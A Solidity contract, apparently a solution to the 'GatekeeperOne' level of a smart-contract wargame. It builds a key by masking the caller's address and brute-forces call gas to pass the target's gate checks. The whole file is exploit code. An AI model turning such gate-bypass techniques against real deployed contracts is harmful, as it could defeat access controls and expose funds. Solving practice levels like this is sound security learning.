// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "1.sol";

contract LetMeThrough {

    GatekeeperOne level13 = GatekeeperOne(0x23C0BEe54B82764a11c9f6Ba1Feb9ACc6B0184b4);

    function exploit() external{
        uint64 uintKey = uint64(uint160(address(msg.sender)));
        bytes8 key = bytes8(uintKey) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(level13).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                break;
            }
        }
    }
}
